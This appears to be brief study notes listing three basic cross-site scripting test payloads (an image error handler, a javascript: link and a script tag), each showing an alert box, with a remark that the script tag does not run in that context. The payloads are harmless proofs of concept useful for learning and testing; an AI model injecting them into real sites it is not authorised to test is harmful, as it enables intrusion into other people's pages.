XSS

1.

```html
<img src="" onerror="alert('xss!')">
```

2.

```html
<a href="javascript:alert('xss!')">Click</a>
```

3. (not work because is not interpreted by browser)

```html
<script>alert('xss!')</script>
```